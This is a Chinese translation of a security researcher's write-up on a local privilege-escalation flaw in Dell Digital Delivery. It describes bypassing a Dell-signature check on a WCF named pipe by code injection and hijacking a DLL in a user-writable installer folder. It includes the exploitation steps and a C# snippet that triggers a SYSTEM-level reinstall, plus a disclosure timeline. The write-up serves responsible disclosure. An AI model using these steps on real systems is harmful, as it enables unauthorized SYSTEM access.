原创： 菜包猪  合天智汇

  

早在3、4月的时候，我开始逆向我笔记本上一系列的戴尔程序。这些程序和服务权限都较高，并且运行时候做的任务比较复杂。我之前在SupportAssist里发现过一个本地提权漏洞,
现在又在戴尔的数字传送平台（Digital Delivery platform）里发现了另一个。这篇文章就讲讲戴尔数字传送（以下简称为DDD，Dell
Digital Delivery）里的这个漏洞是怎么被利用的。至今还没有人利用这个漏洞造成危害。戴尔已经针对这个漏洞发布了安全报告。

SupportAssist和DDD很复杂，所以漏洞也会很多。如果你对挖掘大型的C#/C++应用里的本地提权漏洞感兴趣，可以试试这两个程序。

Dell’s Digital Delivery是用来安装软件的。它可以让用户购买、管理软件，并且DDD预装在大部分的戴尔电脑上。

## Bug

DDD以SYSTEM权限运行，服务名是DeliveryService,
程序名是DeliveryService.exe。DeliveryTray.exe是用户层面的组件，让用户可以对软件进行管理、安装。

DeliveryTray和DeliveryService之间的通信是通过一个Windows Communication Foundation
(WCF)命名管道进行的。WCF 是两个进程交换数据的标准方法。像web服务器的REST API一样，WCF允许服务注册为处理端并说明主要功能。

`Dell.ClientFulfillmentService.Controller.Initialize`中对WCF命名管道的初始化如下所示:

  1. `this._host = WcfServiceUtil.StandupServiceHost(typeof(UiWcfSession),`

  2. ` typeof(IClientFulfillmentPipeService),`

  3. ` "DDDService");`

初始化过程调用了 `Dell.NamedPipe.StandupServiceHost`:

  1. `ServiceHost host = null;`

  2. `string apiUrl = "net.pipe://localhost/DDDService/IClientFulfillmentPipeService";`

  3. `Uri realUri = new Uri("net.pipe://localhost/" + Guid.NewGuid().ToString());`

  4. `Tryblock.Run(delegate`

  5. `{`

  6. ` host = new ServiceHost(classType, new Uri[]`

  7. ` {`

  8. ` realUri`

  9. ` });`

  10. ` host.AddServiceEndpoint(interfaceType, WcfServiceUtil.CreateDefaultBinding(), string.Empty);`

  11. ` host.Open();`

  12. `}, null, null);`

  13. `AuthenticationManager.Singleton.RegisterEndpoint(apiUrl, realUri.AbsoluteUri);`

由apiUrl注册的服务开始侦听，AuthenticationManager的singleton负责处理请求。一有请求，AuthenticationManager就将其传给AuthPipeWorker函数执行以下身份验证：

  1. `string execuableByProcessId = AuthenticationManager.GetExecuableByProcessId(processId);`

  2. `bool flag2 = !FileUtils.IsSignedByDell(execuableByProcessId);`

  3. `if (!flag2)`

  4. `{`

  5. ` ...`

仅当另一端是由戴尔签名的二进制文件时，请求才会建立连接。

这是在3.1 (我最初测试时候的版本) 和3.5 (现在的最新版,
3.5.1001.0)版本之间加进来的新防护措施，戴尔可能意识到了这里有漏洞点。但这防护还远远不够。我可以通过生成一个由戴尔签名的二进制文件(例如DeliveryTray.exe)并在其中注入代码来绕过这个防护措施。注入代码后，可以访问特权服务的WCF
API。

端点服务由Dell.NamedPipe实现，有十几个函数。如下所示：

  1. `ArchiveAndResetSettings`

  2. `EnableEntitlements`

  3. `EnableEntitlementsAsync`

  4. `GetAppSetting`

  5. `PingTrayApp`

  6. `PollEntitlementService`

  7. `RebootMachine`

  8. `ReInstallEntitlement`

  9. `ResumeAllOperations`

  10. `SetAppSetting`

  11. `SetAppState`

  12. `SetEntitlementList`

  13. `SetUserDownloadChoice`

  14. `SetWallpaper`

  15. `ShowBalloonTip`

  16. `ShutDownApp`

  17. `UpdateEntitlementUiState`

DDD将应用程序安装包称为“entitlements”（可以在以上所列函数中找到对应项）,安装/重装自然就是指那些可以被安装以及已经安装好的软件包。

我第一个研究的函数是 `ReInstallEntitlement，`顾名思义，它会启动一个已安装程序包的重装进程。代码实现如下所示：

  1. `private static void ReInstallEntitlementThreadStart(object reInstallArgs)`

  2. `{`

  3. ` PipeServiceClient.ReInstallArgs ra = (PipeServiceClient.ReInstallArgs)reInstallArgs;`

  4. ` PipeServiceClient.TryWcfCall(delegate`

  5. ` {`

  6. ` PipeServiceClient._commChannel.ReInstall(ra.EntitlementId, ra.RunAsUser);`

  7. ` }, string.Concat(new object[]`

  8. ` {`

  9. ` "ReInstall ",`

  10. ` ra.EntitlementId,`

  11. ` " ",`

  12. ` ra.RunAsUser.ToString()`

  13. ` }));`

  14. `}`

这个函数通过一个WCF调用将根据请求构建好的参数送到WCF端点。 `ReInstallEntitlement`有两个参数:
一个软件包ID和一个RunAsUser标志（如上所示），都由调用者控制。

在服务端 `Dell.ClientFulfillmentService.Controller` 管理这些函数的具体实现， `OnReInstall`
处理重装进程，它先执行一些完整性检查、验证包签名，然后让 `InstallationManager` 将重装请求压入任务队列。
`InstallationManager` 有一个任务队列以及检查新任务的后台线程( `WorkingThread`) ，当收到新的安装请求时就会调用
`InstallSoftware`。

软件包将缓存到磁盘并等待重新安装。安装步骤就不多说了。

将放在 `C:\ProgramData\Dell\DigitalDelivery\Downloads\Software\`
的安装包先解压然后安装。比如我们安装 `DellDataProtection-SecurityToolsv1.9.1`，你就会在任务管理器里看到一个安装进程：

  1. `"C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _`

  2. `Security Tools v1.9.1\STSetup.exe" -y -gm2 /S /z"\"CIRRUS_INSTALL,`

  3. `SUPPRESSREBOOT=1\""`

此进程的运行用户由可控制的RunAsUser标志确定，如果设置为False，则使用 `SYSTEM`权限从 `%ProgramData%` 目录中运行。

在 `STSetup` 进程的启动阶段，任务管理器中有如下进程：

  1. `C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\VERSION.dll`

  2. `C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\UxTheme.dll`

  3. `C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\PROPSYS.dll`

  4. `C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\apphelp.dll`

  5. `C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\Secur32.dll`

  6. `C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\api-ms-win-downlevel-advapi32-l2-1-0.dll`

这里有意思的是，系统中的用户对父目录
`%ProgramData%\Dell\DigitalDelivery\Downloads\Software`都没有写入权限，但对安装包文件夹
`DellDataProtection-SecurityTools` 有写入权限。

这让非特权用户可以将任意文件放入这个目录，给了我们使用DLL注入的机会。

## 漏洞利用

漏洞利用有以下步骤：

  1. 将DLL放在适当的 `%ProgramData%` 软件包目录下

  2. 启动运行由Dell签名的可执行文件的新进程

  3. 将C#代码注入这个进程（运行在无特权的用户空间中）

  4. 从被注入的进程中连接到WCF命名管道

  5. 触发ReInstallEntitlement

步骤4、5可以用下面的C#代码完成：

  1. `PipeServiceClient client = new PipeServiceClient();`

  2. `client.Initialize();`

  3.   

  4. `while (PipeServiceClient.AppState == AppState.Initializing)`

  5. ` System.Threading.Thread.Sleep(1000);`

  6.   

  7. `EntitlementUiWrapper entitle = PipeServiceClient.EntitlementList[0];`

  8. `PipeServiceClient.ReInstallEntitlement(entitle.ID, false);`

  9. `System.Threading.Thread.Sleep(30000);`

  10.   

  11. `PipeServiceClient.CloseConnection();`

上面用到的类是从
`NamedPipe.dll`导入的。我这里仅仅选择了第一个可选的软件包然后重装，你可能需要遍历软件包来确定哪个软件包的重装进程会用到你注入的代码。

我在Github上放出了PoC, 戴尔也已经放出了相应的安全报告。

## 时间线

05/24/18 – 初次漏洞报告05/30/18 – 戴尔请求获得更多信息06/26/18 – 戴尔提供有关审核和修复的更新07/06/18 –
戴尔提供内部跟踪ID并更新进度07/24/18 – 更新请求07/30/18 – 戴尔确认他们将发布安全建议和相关的CVE08/07/18 –
允许90天后进行漏洞细节公开08/10/18 – 戴尔确认公开日期为8月22日08/22/18 – 公开漏洞细节

翻译原文链接：

http://hatriot.github.io/blog/2018/08/22/dell-digital-delive

（如需转载请注明出处！）

  

